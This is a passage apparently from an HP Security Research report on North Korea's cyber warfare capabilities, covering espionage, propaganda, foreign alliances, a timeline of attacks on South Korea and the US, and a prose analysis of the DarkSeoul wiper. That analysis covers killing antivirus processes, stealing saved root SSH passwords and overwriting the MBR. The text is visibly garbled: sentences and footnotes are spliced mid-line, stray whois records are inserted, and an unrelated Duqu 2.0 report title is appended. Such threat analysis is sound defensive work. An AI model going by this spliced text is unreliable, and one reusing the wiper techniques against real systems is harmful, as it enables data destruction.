is responsible for oversight of this network.182 The businesses include cafes and                                             businesses located in 30 to
other non-suspect establishments.The highest concentration of these is in China.40 countries that is used for
                                                                                                                              espionage activities.The regime is also known to kidnap foreign citizens and use them as instruments
for intelligence.Prisoners are first tortured and psychologically conditioned to bend to the
regime’s will.They are then used based on their skillset.Sanctions to be lifted include the ban on port calls to Japan by North Korean ships.186

North Korea has also infiltrated important positions in South Korea for both intelligence and
psychological operations purposes.187 In 2011, South Korea’s National Intelligence
Service reportedly discovered the presence of Communist spies.These spies within their trusted
circles had been reporting back to North Korea for almost 10 years.The embedded spies included
a Democratic Party representative.According to the agency, the spies were on a mission to
infiltrate and influence the Democratic Party and to gather military intelligence.188 The regime also
attempts to infiltrate organizations made up of North Koreans who seek shelter in South Korea, in
order to gain intelligence.In the past several years, South Korea has arrested at least 14 defectors
who were found to be spies.189

These intelligence collection and counterintelligence capabilities are an attempt to provide the
regime with a strategic asymmetrical advantage.The regime leverages its human and cyber
resources around the globe to provide an influx of intelligence, while very little credible
intelligence about the regime’s activities and capabilities ever becomes available to the outside
world.Psychological operations
North Korea continues to be a master of propaganda and deception and leverages the cyber
realm for psychological operations.Modern North Korean psychological operations tactics include
distribution of propaganda via traditional media outlets, websites, and social media.Many of
these psychological operations campaigns are politically focused.190 According to Dr. Andrei
Lankov, the North Korean government has “very rational and highly successful manipulators who
usually get what they want by outsmarting everybody else in the process.”191

The regime’s Unit 204 is responsible for cyber-psychological operations.These
operations are PSYOP tailored for the cyber arena.In order to be successful, cyber-     Such messages can be
                                                                                         used for recruitment,
psychological campaigns require speed, precision, and creativity.These campaigns        cyber mobilization, and to
leverage the phenomenon of viral, unverified news stories that tend to rapidly           instill fear in a target
propagate via social media, mobile text messaging, and other electronic                  population.communications.This phenomenon creates an arena for strategic propagation of both
fact and fiction for the purposes of sentiment manipulation.Cyber-psychological
operations may also include mental suggestion using technology as a delivery mechanism for
subliminal cues.It is unknown whether North Korea possesses this capability.192

North Korean citizens have access to state-approved social networks on the Kwangmyong.193




Figure 16 A photo posted by Jean Lee on Instagram shows one of the social networking sites on
the Kwangmyong.194

The regime has a limited overt social media presence on the Internet.Some of the known social
media platforms employed by the regime include Twitter, Facebook, and YouTube.The YouTube
channel North Korea Today, operated by user rodrigorojo1, features news clips from North Korea.North Koreans accept military duty as an         may have never been
honor and strive to excel in their service to the regime.North Korea portrays the West, particularly
the United States, as an enemy.The regime uses this strategy of shifting the population’s
negative sentiments toward an external entity to keep its citizens ignorant of North Korea’s own
economic hardship, regime brutality, and systemic incompetence.211 For example, prior to Kim
Jong Il’s death in 2011, North Korean media altered photos of their “Dear Leader” to make him
appear younger and healthier than he really was.This became obvious when the altered photos
were compared to those taken by Western media around the same time.212

According to Dr. Andrei Lankov, “North Koreans now have a much better understanding of what is
going on in the outside than they did before.This is largely thanks to the spread of DVDs and
video content in the country, but also because some of them have been to China and talk about
what they have seen…many [of] them sincerely believe that the United States remains ready to
attack at any moment and that Japan is an incurably aggressive place…nearly all of them swallow
the official propaganda myths about the Korean War being started by the 'American Imperialists'
who invaded them.Hence, they see the outside world as an inherently dangerous place.”213 Some
human rights groups seek to reach out to North Korean citizens and break them from this
isolation.In August 2014, the New York-based charity Human Rights Foundation sponsored a
hackathon in San Francisco called “Hack North Korea” to find new ways to get information in, out,
and around North Korea.The event brought together many programmers, human rights
campaigners, and defectors.214

North Korea even uses “trolling” as a PSYOP tactic.On the Internet, “trolls” are users who post
messages that are often crass, controversial, inflammatory, or offensive, in order to evoke a
strong reaction or influence a reader’s opinion.Often, the motivation for trolling is simply for the
troll’s enjoyment.The rude and offensive trolling tactics are in stark contrast to traditional forms
of persuasive rhetoric.The ability to influence outsiders, while effectively
isolating its own population from most outside influence, allows North Korea to remain an
enigma.Additionally, in line with its PSYOP tactics, North Korea may strategically take credit for
cyber attacks that were, in reality, launched by another entity.First, to claim credit for an attack amplifies
the impact of a show of force, particularly if South Korea is the target.This tactic can be used to
stir sentiments in order to provoke a reaction.Second, North Korea may lay claim to responsibility
for an attack that exceeds its capabilities in order to seem more technologically advanced and
more capable.Third, any success, or the appearance thereof, enforces the juche ideal of regime
self-sufficiency.221 A report from the
U.S. Department of Homeland Security (DHS) noted North Korea’s ability to deliver a nuclear
warhead as a satellite over the South Pole, effectively creating the burst needed to deliver an EMP
targeting the United States.An EMP could effectively disrupt electronic communications including
critical infrastructure components such as telecommunications, financial institutions, the energy
sector, transportation, food and water delivery, emergency services, and space systems.222 North
Korea reportedly acquired its EMP technology from Russia.223

North Korea also has a drone program.The regime reportedly acquired its first drones in the late
1980’s or early 1990’s.According to reports by defectors, the regime seeks out children who show
mathematical talent and sends them through rigorous advanced training.230 A vintage North
Korean animation stresses the importance of mathematics in North Korean education.The short
film follows a young boy as he does his geometry homework.Kim Il-sung University’s computer center was started in 1985.Its computer courses have a heavy
programming element.The university reportedly developed the Intelligent Locker hard disc
protection program, Worluf Antivirus, SIMNA (simulation and system analysis program), a war
games program, a hepatitis diagnosis and prescription system, and a C++ program development
tool called FC 2.0.237 Kim Il-sung University also has programs focusing on nuclear research.238

Kim Chaek University of Technology was established in 1948.In the late 1990s, it began to
restructure its computer-focused courses to reflect more modern technologies.As of 2002, the
university had three colleges focusing on computer science, information science and technology,
and machine science.For example, parents of students
graduating from the cyber program with top scores are given the opportunity to live in
Pyongyang; and married cyber operators are given housing, a food allowance, and a stipend if
operating overseas.Due to the nature of their profession, these cyber elite are some of the only
North Koreans allowed to access the outside Internet.244

Important political and military ties
While this report focuses on North Korea’s cyber warfare capabilities, these capabilities cannot be
fully separated from the implications of partnerships with countries known to deal in illegal
weapons trade with the regime.Now that cyberspace has become a legitimate arena for warfare,
these nations are also potential allies in the cyber realm.For this reason, the regime’s key political
and military relationships are explored below.China
North Korea has a longstanding historical relationship with China.During the Korean War (1950-
1953), China allied with North Korea’s Communist forces.China has also provided ongoing
political and economic support to the regime’s leadership and is a primary trade partner.North
Korea is economically dependent on China.North Korea gets an estimated 90 percent of its
energy imports, 80 percent of its consumer goods, and 45 percent of its food supply from China.This relationship is prudent – in the event of a military conflict, China can strategically use North
Korea as a buffer zone between itself and South Korea, where many U.S. military personnel are
stationed.Chinese aid to North Korea also deters the likelihood that the regime will collapse,
resulting in internal destabilization that could catalyze a U.S.-China conflict.245

North Korea relies heavily on China for technological resources.The former Soviet Union was the major sponsor
of the North Korean state and a major trading partner.Following the dissolution of the Soviet
Union, aid to North Korea was halted and trade diminished significantly.This chain of events
contributed to North Korea’s eventual economic collapse, as it could not survive without aid.252

North Korea currently has a collaborative relationship with Russia in the cyber realm.The regime’s
CSTIA relies on Russia as one of several sources for technical data.253 North Korea also sends
some of its cyber warriors to train in Russia,254 and the regime reportedly acquired its EMP
technology from there.255

Political ties between Russia and North Korea have become stronger in recent months.In 2014,
potentially as a result of the U.S. response to the Russian-Ukranian conflict, Russia began to
strengthen ties with North Korea.Negotiations reportedly included promises of trade and
development projects.Narushige Michishita, a North Korea and Asia security expert at Japan's
National Graduate Institute for Policy Studies, stated “By strengthening its relationship with North
Korea, Russia is trying to enhance its bargaining position vis-à-vis the United States and Japan.”256
Russia also recently forgave most of the regime’s debts.257

Iran
North Korea and Iran have longstanding political and military ties.North Korea supplied Iran with
conventional arms during the Iran-Iraq War.Iran and North Korea reportedly collaborate closely in
ballistic missile development efforts.In the past, Iran provided the North Korean regime with
necessary funds and oil in exchange for missile parts and technology.258 259 In 2009, a North
Korean plane transporting 35 tons of weapons and allegedly bound for Iran was seized after
making an unscheduled stop in Bangkok, Thailand.That same year, United Arab Emirates seized a
ship bound for Iran that was transporting several containers of North Korean weapons, including
rocket-propelled grenades and ammunition.Reportedly, the customer was a company affiliated
with Iran’s Islamic Revolutionary Guard Corps.260 261

North Korea also has cyberwar ties with Iran.In 2012, North Korea and Iran signed a technology
treaty to help combat “common enemies” in cyberspace.The treaty included provisions for
cooperation in research, student exchanges, and joint laboratories.F-Secure’s Mikko Hypponen stated, "It's highly likely that one of the reasons for this co-operation
is for them to work together regarding their cyber defence and cyber offense strategies".Hypponen cited Flame malware as a possible triggering event for the creation of this treaty.KCC reportedly has
a branch in Syria.267

In 2007, Israel launched an airstrike, destroying a Syrian target that was allegedly a nuclear facility
under construction with North Korea’s assistance.U.S. officials noted the facility was modeled on
the North Korean nuclear reactor at Yongbyon.268

The North Korea-Syria relationship becomes more important in the context of both countries’ ties
with Iran.As noted above, Iran, North Korea, and Syria jointly provide support to extremist groups
Hamas and Hezbollah.269 270 271 Additionally, as we explored in HPSR Security Briefing Episode 11,
Iran and Syria’s military alliances extend to joint SIGINT and cyber operations.272

Cuba
North Korea also has an interesting relationship with Cuba – one that includes supplying weapons
and apparent attempts to illegally smuggle weapons.In 2013, a North Korean cargo ship on its
return voyage was stopped near the Panama Canal.The ship was carrying surface-to-air missile
parts, disguised as containers of sugar.Experts said the cargo appeared to include a SNR-75 Fan Song
fire-control radar system for an SA-2 missile, a Soviet-era missile system that was also used in
Cuba.273 Following the incident, Fidel Castro credited former North Korean leader Kim Il-Sung for
providing Cuba with weapons near the end of the Cold War.Weapons included 100,000 AK rifles
and necessary ammunition.274

While no apparent cyber relationship exists between North Korea and Cuba at this time, their track
record for weapons trade means the potential for future collaboration in the cyber realm cannot
be discounted.Timeline of significant North Korean cyber activity
2004
          North Korea gains access to 33 South Korean military wireless communication
           networks275
2006
          The U.S. State Department is attacked by entities in the East Asia-Pacific region.The
           attacks coincided with State Department negotiations with North Korea regarding the
           regime’s nuclear missile tests.(June)276
          A South Korean military official states North Korea’s Unit 121 has breached South Korean
           and U.S. military entities.(July)277
2007
          North Korea tests a logic bomb (October)278
2009
          North Korea states that it is “fully ready for any form of high-tech war.” (June)279
          DarkSeoul DDoS and disk wiping malware targeting South Korean and U.S. government,
           media outlet, and financial websites.These attacks also coincided with U.S.Independence
           Day.Analysis of North Korean cyber activity gives insight into these patterns and also helps tie
together North Korea’s strategic, tactical, and operational capabilities.Strategic capabilities refer
to the assets used in support of a long-term, overarching goal.Tactical capabilities refer to the
methods and maneuvers actually implemented in pursuit of the strategic goal.304 Operational
capabilities refer to the potential use of these capabilities.305

 In 2004, in response to the annual U.S. – South Korea joint military exercises, North Korea
reportedly gained access to 33 South Korean military wireless communication networks.306 The
next significant cyber attack attributed to North Korea was in June 2006.The U.S. State
Department was attacked by entities in the East Asia-Pacific region.The attacks coincided with
State Department negotiations with North Korea regarding the regime’s nuclear missile tests.307
In July 2006, North Korea’s Unit 121 reportedly breached South Korean and U.S. military
entities.308 This attack was concurrent with the regime’s test-fire of at least one long-range
missile and several medium-range missiles.309

2007 was politically tumultuous for North Korea.Following multi-national talks, the UN’s
International Atomic Energy Agency (IAEA) ordered the shutdown of the regime’s nuclear facilities
in Yongbyon in July.310 Its nuclear efforts temporarily thwarted, North Korea tested a logic bomb
in October 2007.311

In April 2009, North Korea ejected IAEA and U.S. nuclear compliance officials.The regime indicated
refusal to comply with any UN agreements regarding nuclear weaponry and announced it would
reinstate its nuclear materials production.The next month, North Korea conducted an
underground nuclear test and voiced its confidence that the regime was well on its way to
producing viable nuclear technology.The UN called an emergency meeting condemning the
nuclear weapons test, and South Korea joined the Proliferation Security Initiative (PSI).North
Korea issued a statement via KCNA calling South Korea’s involvement in PSI an act of war.312 In
June 2009, North Korea stated that it was “fully ready for any form of high-tech war.”313 The
following month, DDoS and disk wiping malware, later known as DarkSeoul, targeted South
Korean and U.S. government entities, media outlets, and financial websites.The attacks coincided



304
    http://www.scholastic.com/teachers/article/strategy-and-tactics-military
305
    http://www.dau.mil/pubscats/Pages/preface.aspx
306
    http://www.scribd.com/doc/15078953/Cyber-Threat-Posed-by-North-Korea-and-China-to-South-Korea-and-US-Forces-Korea
307
    http://www.informationweek.com/state-department-releases-details-of-computer-system-attacks/d/d-id/1045112?Independence Day.314 315 Other malware used for Operation Troy was also planted.Operation Troy would continue for several years, largely undetected.316

In early 2011, political and military tensions were high.In February, James Clapper, United States
Director of National Intelligence, testified that North Korea likely had undeclared uranium
enrichment facilities as part of its nuclear weapons program.317 In March 2011, South Korean
media, financial, and critical infrastructure targets suffered a DDoS and disk-wiping malware
attack later known as the “10 Days of Rain”.U.S. and South Korean military entities were also
targeted by DDoS during this attack.The attack used the DarkSeoul malware.318 North Korea also
disrupted South Korean GPS signals.Additionally, North Korean actors reportedly attempted a
DDoS attack against South Korea’s Incheon Airport that same month.319 These incidents coincided
with the annual U.S. – South Korea joint military exercises.320 The following month, North Korean
actors reportedly launched a DDoS attack against South Korea’s Nonghyup bank.321

In 2012, an attack on South Korean Newspaper JoongAng Ilbo was attributed to North Korean
actors.This attack also coincided with the timing of the annual joint U.S. – South Korea military
exercises.322 In September 2012, North Korea signed a cyber treaty with Iran, agreeing the two
nations would collaborate to combat “common enemies” in cyberspace.323

The week of March 11, 2013, the U.S. and South Korea began their annual joint military exercise
near the Korean Peninsula.Like clockwork, attacks attributed to North Korea and now known as
the March 20 attacks targeted three South Korean media outlets and Shinhan, Nonghyup, and Jeju
banks.North Korea also exhibited other hostile activity at that time.North Korea cut
communication with Seoul and announced it had scrapped the 1953 armistice between the two
Koreas.327

In May 2013, DarkSeoul malware was used to attack several South Korean financial institutions;
and in June, DarkSeoul DDoS attacks were launched against the South Korean government’s DNS
server.The latter took place on June 25, the anniversary of the start of the Korean War.328

As evidenced above, much of North Korea’s cyber activity coincides with the annual U.S. – South
Korea joint military exercises.Attacks not following that pattern were typically in response to
political events impacting the regime or correlated with significant dates, such as the anniversary
of the start of the Korean War.The regime’s strategic assets and tactical capabilities in the cyber
arena seem to have evolved only slightly since 2009.Most of the attacks attributed to North
Korea employ limited tactics, and their operational capability demonstrates an increase in the
frequency and volume of attacks but is otherwise unimpressive to date.In June 2014, the regime demanded cancellation of the annual U.S. - South Korea joint military
exercise, attempting to use participation in the upcoming Asian Games as a bargaining chip.329 The
regime’s demands may have had other political motivations, as they preceded the July 2014
meeting between South Korean president Park and Chinese President Xi Jinping.According to statements from the South Korean government, North Korea’s Lab 110
were the actors behind the DarkSeoul malware.institutions.334

Some of the DarkSeoul attacks corresponded with significant dates, such as U.S.Independence
Day or the anniversary of the start of the Korean War.DarkSeoul attacks go beyond denial of
service and sabotage.As early as 2009, the group responsible for the Dark Seoul attacks
launched “Operation Troy”, an espionage campaign targeting the South Korean military.The
operation was codenamed “Troy” due to the frequent use of the word “Troy” in the malware’s
compile path strings.335 The malware used in these attacks sought out and exfiltrated data, based
on keyword searches.While the malware was clearly intended to search for and exfiltrate certain
types of data, its true impact on the targets was never revealed.336 The March 2011 “10 Days of
Rain” DDoS attacks on U.S. and South Korean sites have also been attributed to the actors
associated with DarkSeoul.337 According to Symantec, the politically motivated attacks have
required a level of intelligence, coordination, monetary support, and technical sophistication that
suggests state sponsorship.338 This designation means the group can be considered an advanced
persistent threat (APT).A March 20, 2013 attack attributed to the DarkSeoul actors targeted three South Korean media
outlets and Shinhan, Nonghyup, and Jeju banks.The impact of the March 20 attacks included
disruption of service at financial institutions and data deletion.However, the targeted entities
resumed normal operations shortly thereafter.339 According to South Korean reports, the media
outlets targeted corresponded with those listed by the North Korean regime in 2012 as right-wing
press that manipulated South Korea’s public opinion.The malware attempted to disable AhnLab and Hauri AV antivirus products then
proceeded to overwrite the master boot record (MBR).The attack was capable of wiping both
Linux and Windows machines.341 McAfee found that these attacks were the culmination of the
malware campaign they dubbed “Operation Troy”.342

A report from IssueMakersLab tied the actors responsible for the March 20, 2013 attacks to cyber
attack activity occurring as early as 2007.AlienVault suspected the Chinese exploit kit GonDad was used to
spread the malware, and the Korean domains serving the malware were registered using a
Chinese email address.Additionally, researchers at AhnLab in South Korea noted a Chinese IP
address linked to the attacks.346

While no concrete evidence has been released that indicates Lab 110 was responsible for the
DarkSeoul attacks, the responsible group’s targets, TTP, and attack timing demonstrate a strong
pro-North Korean sentiment.343
    https://docs.google.com/file/d/0B6CK-ZBGuMe4dGVHdTZnenJMRUk/preview?pli=1
344
    http://english.yonhapnews.co.kr/national/2013/04/11/79/0301000000AEN20130411008351320F.HTML
345
    http://www.darkreading.com/attacks-and-breaches/how-south-korea-traced-hacker-to-pyongyang/d/d-id/1109491?A defacement on the LG +U webpage stated that it was “Hacked by WhoIs Team”
and that the attackers would return.The page featured three skulls.354 However, no other attacks
by WhoIs Team have been observed.RAON_ASRT is a
South Korean white hat capture the flag (CTF) team, whose members also operate under the
name “WhoIs”.357




l
Figure 27 A screenshot showing that South Korea’s RAON_ASRT white hat CTF team also uses the
moniker WhoIs.358

RAON_ASRT (the RaonSecure Advanced Security Research Team) and its sub-teams WhoIs Team
and Cpark Team359 have participated in and performed well in CTF contests such as the one
hosted by DefCon.IsOne
IsOne is the group that claimed responsibility for the June 2012 attack on the website of South
Korean newspaper JoongAng Ilbo.The attack included an attempt to wipe JoongAng Ilbo’s servers
as well as a defacement depicting a laughing cat.Despite efforts to wipe the target’s servers, the
target only suffered defacement and temporary downtime.365




Figure 28 Defacement by “IsOne”.366

Although the groups have a similar name and both use a cat theme, it is unclear whether a CTF
team known as “The Cat is Number 1” and IsOne are the same actors.Figure 29 A screenshot of “The Cat is Number One” profile on CTF Time 368

According to South Korea’s National Police Agency, the attack on JoongAng Ilbo shares
characteristics with previous attacks attributed to North Korean actors.An investigation
conducted by the agency’s Cyber Terror Response Center found that the actors targeting
JoongAng Ilbo used two North Korean servers and 17 servers in 10 other countries.One server
maintained a constant connection to an IP address belonging to Joson Telecommunication
Company, which is affiliated with North Korea’s Ministry of Posts and Telecommunications.Investigators found that one of the servers used in the attack on JoongAng Ilbo was also used in
the March 2011 DDoS attacks on South Korean critical infrastructure sites and the April 2011
attack on Nyongyup Bank.369

Known tactics, techniques and procedures
    Wiper malware
    Defacements

Targets
           Took credit for defacing JoongAng Ilbo.367
    https://ctftime.org/team/2538
368
    https://ctftime.org/team/2538
369
    http://koreajoongangdaily.joins.com/news/article/article.aspx?aid=2965629
Kimsukyang
The Kimsuky malware, which targeted South Korean think tanks, is loosely attributed to an actor
referred to as Kimsukyang.Little is known about the actor or group responsible for the malware.It is interesting to note that the malware associated with these actors uses the strings “HASTATI”
and “PRINCIPES” to overwrite the MBR.The name Hastati likely refers to a class of infantrymen of
the early Roman Republic.The Hastati were less experienced soldiers who fought on the
frontlines with spears and swords.Principes likely refers to more experienced Roman soldiers
who fought on the second line of battle.375




Figure 30 Defacement by Hastati.376

Known tactics, techniques and procedures
    Wiper malware

Targets
          KBS TV377
          Entities targeted in Operation Troy378

Malware summary
HP researchers had previously analyzed samples of the DarkSeoul dropper, and findings were
published in our annual HP Cyber Risk Report 2013.Analysis of this malware is included in
Appendix C. Analysis of additional malware used in these campaigns produced no new findings
and only corroborated what was found by external security researchers.These publicly available
analyses have been cited throughout the report.Some of the malware samples were no longer
publicly available.However, CrowdStrike obtained these missing samples before they
disappeared from the wild and conducted thorough analysis, which was released in their
subscription-only reports.While we cannot divulge detailed information from those reports, an
overview of the findings is provided below.374
    http://www.darkreading.com/attacks-and-breaches/south-korean-bank-hackers-target-us-military-secrets/d/d-id/1110674?375
    http://www.roman-empire.net/army/army.html#earlylegion
376
    http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/
377
    http://eromang.zataz.com/2013/04/02/dark-south-korea-total-war-review/
378
    http://www.mcafee.com/us/resources/white-papers/wp-dissecting-operation-troy.pdf
The majority of the malware used in cyber incidents attributed to North Korea were variations of
three types of malware: dropper, wiper, and IRC remote access trojan (RAT).CrowdStrike’s
attribution of this malware to North Korean actors stemmed from two primary factors: Korean
language characters found in the binaries and the propensity to specifically target South Korean
entities.379

Dropper samples consistently targeted AhnLab Policy Center as a propagation method.This
information is corroborated in a Black Hat Asia 2014 presentation by Fortinet researcher Kyle
Yang.380 CrowdStrike’s report also briefly noted the use of an update server vector.381 Yang
analyzed the malware's update config metadata and matched its format to the AhnLab Policy
Center.To test its payload, Yang set up a server/client and executed the update through the
server.As Yang had predicted, it wiped the client.382 While the method for initial compromise of
the update server is not noted in detail, CrowdStrike’s report cites “collateral information” that
suggests targeted email attacks were used to gain initial entry, and policy servers were then
compromised.The upload server vector included a time-based logic bomb that allowed the wiper
to target a large number of systems, on a set time and date, with full permissions on all of the
targeted systems.383

According to CrowdStrike, the wiper malware was dropped on the systems as AgentBase.exe.The
wiper used the Windows utility 'taskkill' to kill the processes pasvc.exe and clisvc.exe, which are
the main processes for the Ahnlab and Hauri antivirus applications.384 385 The wiper then
performed system reconnaissance, gathering drive information and operating system version.Depending on the OS used, the wiper recursively deleted files on the file system, deleting the
Windows folder last.It then overwrote the MBR with the strings "HASTATI", "PRINCPES",
"PRINCIPES", or "PR!NCPES”.386

While there are several variants of the wiper, all seem to have been used on the same date.It is
unclear why multiple wiper variants with slightly differing behavior were used for the same
campaign.One possible explanation is that multiple variants were used to minimize the
operational damage to the mission in the case of an early detection of one of the variants.For
example, if one wiper variant was compromised or detected by antivirus or IDS signatures, the
other variants may have differed enough to remain undetected, still resulting in mission success.According to CrowdStrike, a third malware component downloaded an IRC RAT from various
compromised websites.This RAT is detected by Symantec as Backdoor.Prioxer.Prioxer has been
linked to other 2011 attacks on South Korea.It is unclear whether these downloaders were



379
    CrowdStrike Intelligence Report CSIR-13013
380
    Yang, Kyle.Z:\Make Troy\, Not War: Case Study of the Wiper APT in Korea, and Beyond.Black Hat Asia, March 2014.381
    CrowdStrike Intelligence Report CSIR-13013
382
    Yang, Kyle.Z:\Make Troy\, Not War: Case Study of the Wiper APT in Korea, and Beyond.Black Hat Asia, March 2014.383
    CrowdStrike Intelligence Report CSIR-13013
384
    CrowdStrike Intelligence Report CSIR-13030
385
    Yang, Kyle.Z:\Make Troy\, Not War: Case Study of the Wiper APT in Korea, and Beyond.Black Hat Asia, March 2014.386
    CrowdStrike Intelligence Report CSIR-13030
pushed out in the same update server vector as the wipers.However, the two malware types both
use the same packer 'Jokra' and both contain the strings “HASTATI" and "PRINCPES”.387

Analysis
Based on the information above, we have identified strategic challenges that impact the
development of North Korea’s cyber warfare capabilities.We have also noted relevant
implications:

      •    The North Korean regime strictly controls all Internet infrastructure,388 meaning cyber
           activity by dissidents or autonomous hacker groups are very unlikely.In other words, any
           cyber attacks originating in North Korea can be assumed to be state sponsored.For this
           reason, according to defectors, the regime’s cyber operators do not typically launch
           attacks directly from within North Korea.Instead, many regime-sponsored attacks are
           launched from cells based in China, U.S., South Asia, Europe, and even South Korea.389
      •    North Korea has a limited number of outgoing connections.390 For this reason, there is a
           low probability of DDoS originating from within.However, this does not preclude the use
           of botnets with a local C2 server or the use of networks in third-party nations to launch
           attacks.As seen in the July 2009 attacks on South Korean and U.S. targets, North Korea
           has leveraged networks in countries such as Austria, Georgia, Germany, and even South
           Korea and the U.S., in order to launch cyber attacks.391 North Korea will likely be forced to
           rely on third parties for quite some time, due to its lack of sufficient infrastructure for
           launching large-scale CNO.•    Several outward facing websites are hosted in China and other countries.This implies two
           possibilities: that North Korea’s infrastructure cannot handle a heavy incoming traffic load
           392
               or that the regime wants to separate the propaganda crafted for an outside target
           audience from internally-focused propaganda.This arrangement seems unlikely to
           change in the foreseeable future.•    North Korea is known to have unstable power supplies393, which limits scalability of the
           regime’s current CNO capabilities.This is another reason why expansion of CNO
           capabilities using the nation’s own infrastructure seems unlikely in the foreseeable future.•    North Korea is known to have monetary deficiencies,394 which further limit expansion of
           infrastructure and CNO capabilities, at least without third-party aid.North Korea continues
           to rely heavily on China for sustainment.395
      •    Although we see few instances of overt cyber operations, that North Korea reportedly
           spends so much of its limited resources on training and equipping cyber operators speaks
           volumes.The human element of the regime’s cyber war program, at least, has potential.North Korea must develop its own
              technology, manufacture technology using plans obtained via industrial espionage, or rely
              on third parties to procure it for them.However, the regime has historically failed in its
              attempts of large-scale production of electronic components.At present, North Korea
              relies on China to provide much of its network hardware, including servers and routers.397
              It is unlikely that North Korea will compromise on its nuclear program, meaning sanctions
              will likely be longstanding, and the regime will have to continue to rely on third parties to
              procure technology.Cyber incidents attributed to North Korean actors seem to follow distinct patterns:

             According to reports by other researchers, the conventions and C2 structure used by
              North Korean cyber actors show continuity and consistency over time.     The majority of the incidents attributed to North Korean actors consistently used wiper
              malware.     Several of the incidents included defacements, with a different group taking credit each
              time.Additionally, little information or attack history was found about any of the groups,
              aside from information acknowledged in this report.These factors seem to indicate that a
              single group may have been responsible for several attacks over time, using different
              group names as a false flag.     On more than one occasion, the malware included provisions to disable security software
              made by South Korean security company AhnLab.This detail strengthens the case that
              the malware was written or modified to specifically target South Korean machines.     The attacks followed an explicit pattern: most were around the time of U.S. – South
              Korean joint military exercises, while the others fell on a significant date or were in
              response to political events.     The primary targets were South Korean and U.S. entities.While these nations are
              traditionally targeted by the regime, it is also possible that South Korean entities are quick
              to attribute any attack on their infrastructure to North Korean actors.In fact, in some
              cases, South Korean reports were the only source of attribution.Summary
Does North Korea have sufficient cyber infrastructure and cyber warfare capabilities to harm the
U.S. and its allies?While North Korea’s cyber warfare capabilities pale in comparison to those of
wealthier nations, the regime has made significant progress in developing its infrastructure and in
establishing cyber operations.The rate of this progress warrants a closer look at North Korea’s
motivations, TTPs, and capabilities.As noted above, North Korea views the U.S. and South Korea
as its primary adversaries.The U.S. and South Korea are high-tech nations with economies that


396
      http://www.foxnews.com/world/2012/04/03/exclusive-cash-for-computers-is-un-busting-its-own-sanctions-in-north-korea/
397
      http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/4
depend heavily on technology.398 In contrast, North Korea does not have a high tech culture.For
these reasons, we should not overestimate the regime’s advanced cyber capability, yet we should
never underestimate the potential impact of North Korea utilizing less advanced, quick-and-dirty
tactics like DDoS to cripple their high-tech targets.Both government and corporate entities are
susceptible to being targeted by North Korean cyber attacks.North Korean juche ideology places
the survival of the regime as its primary goal, and any perceived threat to the regime may be
targeted.Several attacks on U.S. and South Korean government, financial, and critical
infrastructure entities have been attributed to North Korean origins..These attacks were often
preceded by or occurred in conjunction with North Korea voicing negative sentiments about the
targeted entities.As we saw with Iranian cyber actors in HPSR Security Briefing Episode 11,399
state sponsored cyber actors often launch an attack in response to a political trigger.The same
pattern seems to apply to pro-North Korean cyber actors, who have launched attacks to coincide
with U.S.Independence Day and the anniversary of the start of the Korean War, as well as
propaganda and cyber attacks in response to joint military exercises between the U.S. and South
Korea.400 401

As shown by North Korea's past behavior (which is consistent with their doctrine), they are easily
"pushed into a corner".At the slightest perceived threat, the regime responds with saber-rattling
and peacocking.The regime is extremely defensive and will, in turn, flex its muscles to show the
world how capable it is, even if this is an inaccurate display of their overall capabilities.The regime fears losing its control and the nation’s culture to the ever-growing threat of outside
influence, as is evidenced in the regime’s reaction to the comedy film “The Interview”.The regime
has represented itself to its citizens as a powerful and capable entity and has used this status to
control the populace.For this reason, the regime’s leaders are forced to continually demonstrate
this strength and power, or an illusion thereof, both domestically and globally, in order to
maintain the status needed to ensure continued suppression of the population.This show of
power may require that the regime takes chances and stretches beyond its abilities at times, but
in the spirit of juche and songun, the regime will continue this façade, fearful of losing the image
its leaders have worked so hard to maintain.HP Security Research recommendations
North Korean cyber operations are not generally observed originating from home field IP address
space, so geo-IP based blocking of traffic originating from those net-blocks is ineffective.Encouraging such ideas could cause those
entities to become a focal point for North Korean cyber attacks.Due to the fact that North Korean infrastructure is aging and its resources are not able to keep up
with the rest of the world, entities with interesting R&D or IP (intellectual property) - especially
military in nature – could become targets of interest for North Korea.Interest in defense-related
IP and R&D could also stem from North Korea’s relationship with China.In the Chinese business
culture, taking another entity’s IP or R&D is not stealing – it is accepted as business as usual.It is
possible that North Korea, if under Chinese influence, would adopt the same attitude, given the
regime’s limited capacity for homegrown innovation.Known DPRK targets have been limited primarily to South Korean and U.S. organizations and
government entities.For these targets, prudent measures should include:

                Following traditional defense in depth approaches and security best practices
                Monitoring for malware that disables Korean language antivirus software, such as
                 that from AhnLab
                To protect against the attack vectors used in North Korean malware campaigns,
                 an advisable prevention tactic is to focus on hardening update/patch
                 management systems.remarks: To update this object, please contact APNIC
remarks: hostmasters and include your organisation's account
remarks: name in the subject line.remarks:     To update this object, please contact APNIC
remarks:     hostmasters and include your organisation's account
remarks:     name in the subject line.• mRemote—an open source tool for centrally managing remote server connections using a GUI
(Kevin Kline, 2008).69 This tool is no longer being actively developed or supported.• SecureCRT—a commercial SSH and Telnet client by VanDyke Software.If an mRemote installation is located, the dropper reads the configuration file and checks if there’s
a NODE that is defined with “Username=root”, “Protocol=SSH”, and a password that is not blank.If
those conditions are satisfied it extracts the information.The password is decrypted after being
extracted.If a SecureCRT installation is located, the dropper extracts information from sessions that have
Username=root, Protocol=SSH and a saved password.If these conditions are satisfied, the
username, hostname, port, and password are extracted.The password is then decrypted.After extracting these connection and server details, the dropper uses the previously dropped alg.exe and conime.exe to attempt to connect remote servers, upload and run the bash script
~pr1.tmp.The bash script initially checks which UNIX it is running on (of HP-UX, SunOS, Linux, or AIX) and
then attempts to wipe the /kernel, /usr /etc and /home directories, thus rendering the machine
inoperative.Win32 Wiper component

When the AgentBase.exe component is executed, it first attempts to stop the following processes,
presumably in order to evade detection:

• pasvc.exe – policy agent from AhnLab
• clisvc.exe – ViRobot ISMS from Hauri

It then enumerates all physical drives and overwrites the first 512 bytes with the string:
“princpes”, effectively destroying the MBR (master boot record) of the affected drive.It continues to look for removable and fixed drives, locates the root directory on these drives, and
then attempts to delete all files and folders in this directory.Finally, the affected computer is shut down and rebooted, although if the wiping mechanisms
were successful then the machine will not be able to boot.Learn more at
hp.com/go/hpsrDuqu 2.0: 

A comparison to Duqu 

v1.0 (10/Jun/2015) 

 
 

Technical Report 

by 

CrySyS Lab 

http://www.crysys.hu/ 

 

 

 

 

 

 

 

 

 

 

 

 

 
